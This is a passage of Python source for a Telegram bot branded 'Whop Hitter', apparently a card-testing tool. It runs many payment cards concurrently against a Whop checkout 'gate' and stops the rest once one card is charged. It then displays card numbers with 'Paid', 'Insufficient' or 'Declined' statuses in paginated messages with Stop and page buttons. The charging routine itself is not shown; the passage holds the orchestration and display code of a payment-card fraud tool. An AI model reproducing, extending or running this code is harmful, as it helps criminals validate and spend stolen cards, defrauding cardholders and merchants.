                    "emoji": EMOJI_DECLINED
                }


            WHOP_SESSIONS[msg_id]["current_card"] = None
            return result


    tasks = [asyncio.create_task(worker(cc)) for cc in cards]
    WHOP_SESSIONS[msg_id]["tasks"] = tasks

    results = []
    pending = set(tasks)
    paid_found = False


    while pending:
        done, pending = await asyncio.wait(pending, return_when=asyncio.FIRST_COMPLETED)

        for task in done:
            if task.cancelled():
                continue
            try:
                res = task.result()
                results.append(res)

                if res.get('emoji') == EMOJI_CHARGED:
                    paid_found = True
            except Exception as e:
                logger.error(f"Worker task error: {e}")


        if paid_found:
            for t in pending:
                t.cancel()
            pending = set()


        results.sort(key=lambda x: (
            0 if x['emoji'] == EMOJI_CHARGED else 1 if x['emoji'] == EMOJI_INSUFFICIENT else 2
        ))


        if len(results) % UPDATE_EVERY == 0 or not pending:
            elapsed = round(time.time() - start_time, 2)
            WHOP_SESSIONS[msg_id]["results"] = results
            WHOP_SESSIONS[msg_id]["elapsed_final"] = elapsed

            still_working = bool(pending) and not WHOP_SESSIONS[msg_id].get("stopped")
            text = format_page_content(WHOP_SESSIONS[msg_id], elapsed, is_working=still_working)

            try:
                await status_msg.edit_text(text, parse_mode="HTML", reply_markup=get_keyboard(msg_id))
            except TelegramBadRequest:
                pass
            except Exception as e:
                logger.error(f"UI Update error: {e}")


    elapsed_final = round(time.time() - start_time, 2)
    WHOP_SESSIONS[msg_id]["elapsed_final"] = elapsed_final
    WHOP_SESSIONS[msg_id]["final_status"] = (
        "stopped" if WHOP_SESSIONS[msg_id].get("stopped") else "completed"
    )

    final_text = format_page_content(WHOP_SESSIONS[msg_id], elapsed_final, is_working=False)

    try:
        await status_msg.edit_text(final_text, parse_mode="HTML", reply_markup=get_keyboard(msg_id))
    except TelegramBadRequest:
        pass


def format_page_content(state: Dict[str, Any], elapsed: float, is_working: bool) -> str:
    results = state["results"]
    page = state["page"]
    start_idx = page * RESULTS_PER_PAGE
    page_results = results[start_idx : start_idx + RESULTS_PER_PAGE]

    amount = state.get('amount', 'N/A')
    total_cards = state['total_cards']
    progress = f"{len(results)}/{total_cards}"


    has_paid = any(r.get('emoji') == EMOJI_CHARGED for r in results)
    if has_paid:
        status_text = f'Pᴀɪᴅ <tg-emoji emoji-id="{EMOJI_CHARGED}">✅</tg-emoji>'
    elif is_working:
        status_text = 'Hɪᴛᴛɪɴɢ…<tg-emoji emoji-id=\"6154603635981423575\">⏳</tg-emoji>'
    elif state.get('stopped') or state.get('final_status') == 'stopped':
        status_text = f'Sᴛᴏᴘᴘᴇᴅ <tg-emoji emoji-id="{EMOJI_STOP}">🛑</tg-emoji>'
    else:
        status_text = f'Nᴏᴛ Pᴀɪᴅ <tg-emoji emoji-id="{EMOJI_DECLINED}">❌</tg-emoji>'

    text = (
        f'<b><a href="https://t.me/Try_Low">⬢</a> Gᴀᴛᴇ ➵ Wʜᴏᴘ Hɪᴛᴛᴇʀ</b>\n'
        f'<b><a href="https://t.me/Try_Low">⬡</a> Pʀᴏɢʀᴇss ➵ {progress}</b>\n'
        f'<b><a href="https://t.me/Try_Low">⬢</a> Aᴍᴏᴜɴᴛ ➵ {html.escape(amount)}</b>\n'
        f'<b><a href="https://t.me/Try_Low">⬡</a> Sᴛᴀᴛᴜs ➵ {status_text}</b>\n'
        f'━━━━━━━━━━━━━━━━'
    )

    for res in page_results:
        display = res.get('display', 'Unknown')
        emoji = res.get('emoji', EMOJI_DECLINED)

        text += (
            f'\n<b><a href="https://t.me/Try_Low">⎔</a></b> <code>{res["card"]}</code>'
            f'\n➵ <b>{display}</b> <tg-emoji emoji-id="{emoji}">❌</tg-emoji>'
            f'\n━━━━━━━━━━━━━━━━'
        )


    current_card = state.get('current_card')
    if is_working and current_card:
        text += (
            f'\n<b><a href="https://t.me/Try_Low">⎔</a></b> <code>{current_card}</code>'
            f'\n➵ <b>Pʀᴏᴄᴇssɪɴɢ…</b> ⏳'
            f'\n━━━━━━━━━━━━━━━━'
        )

    return text

def get_keyboard(msg_id: int) -> Optional[InlineKeyboardMarkup]:
    state = WHOP_SESSIONS.get(msg_id)
    if not state:
        return None

    total = len(state["results"])
    pages = (total + RESULTS_PER_PAGE - 1) // RESULTS_PER_PAGE if total else 1
    current = state["page"]

    buttons = []
    row = []

    if current > 0:
        row.append(InlineKeyboardButton(text="Back", callback_data=f"whop_prev_{msg_id}"))
    if current < pages - 1:
        row.append(InlineKeyboardButton(text="Next", callback_data=f"whop_next_{msg_id}"))

    if row:
        buttons.append(row)

    running = state.get("final_status") == "checking" and not state.get("stopped")
    if running:
        buttons.append([
            InlineKeyboardButton(
                text="Stop",
                callback_data=f"whop_stop_{msg_id}",
                icon_custom_emoji_id=EMOJI_STOP,
            )
        ])

    if not buttons:
        return None

    return InlineKeyboardMarkup(inline_keyboard=buttons)

@router.callback_query(F.data.startswith("whop_"))
async def whop_callback_handler(callback: types.CallbackQuery):
    data = callback.data
    parts = data.split("_")

    if len(parts) < 3:
        await callback.answer("Invalid callback")
        return

    try:
        msg_id = int(parts[2])
    except ValueError:
        await callback.answer("Invalid ID")
        return

    state = WHOP_SESSIONS.get(msg_id)
    if not state:
        await callback.answer("Session expired or not found.", show_alert=True)
        return

    if callback.from_user.id != state['user_id']:
        await callback.answer("⛔ Not your session.", show_alert=True)
        return

    action = parts[1]
    total_results = len(state["results"])
    total_pages = (total_results + RESULTS_PER_PAGE - 1) // RESULTS_PER_PAGE

    if action == "stop":
        state["stopped"] = True
        for t in state.get("tasks", []):
            if not t.done():
                t.cancel()
        await callback.answer("🛑 Stopping…", show_alert=False)
        return

    if action == "next" and state['page'] < total_pages - 1:
        state['page'] += 1
    elif action == "prev" and state['page'] > 0:
        state['page'] -= 1

    await callback.answer()

    elapsed = state.get('elapsed_final', round(time.time() - state['start_time'], 2))
    text = format_page_content(state, elapsed, is_working=False)

    try:
        await callback.message.edit_text(text, parse_mode="HTML", reply_markup=get_keyboard(msg_id))
    except TelegramBadRequest:
        pass
